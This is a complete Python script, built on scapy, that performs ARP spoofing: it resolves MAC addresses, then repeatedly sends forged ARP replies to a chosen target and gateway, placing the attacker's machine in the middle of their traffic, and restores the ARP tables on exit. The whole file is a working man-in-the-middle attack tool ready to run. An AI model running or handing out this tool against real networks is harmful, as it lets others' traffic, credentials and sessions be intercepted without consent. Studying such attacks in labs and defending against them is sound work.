#!/usr/bin/env python

import scapy.all as scapy
import time

def get_mac(ip):
    # Create an ARP request packet to find the MAC address for the given IP
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    
    # Send the ARP request and receive the response
    answered = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    
    # Return the MAC address from the response
    if answered:
        return answered[0][1].hwsrc
    else:
        print("[-] No response received. Please check the IP address.")

def spoof(target_ip, spoof_ip):
    # Spoof the target IP into believing that the attacker's MAC is the router's MAC
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    # Restore the ARP table of the target and router to its original state
    source_mac = get_mac(source_ip)
    destination_mac = get_mac(destination_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    
    # Send the restore packet multiple times to ensure it is received
    scapy.send(packet, count=4, verbose=False)

try:
    # Get target and gateway IP addresses from user input
    target_ip = input("[+] Enter the 1st target IP >> ")
    gateway_ip = input("[+] Enter the 2nd target IP >> ")
    print("\n")
    
    sent_packets_count = 0
    while True:
        # Continuously send spoofed ARP packets
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        
        # Print the number of spoofed packets sent, updating on the same line
        print("\r[+] Number of Spoofed Packets sent >> " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    # Handle keyboard interrupt and restore ARP tables
    print("\n\n[-] Detected Ctrl + C ....")
    print("[-] Quitting !!!")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] ARP Table restored. ")

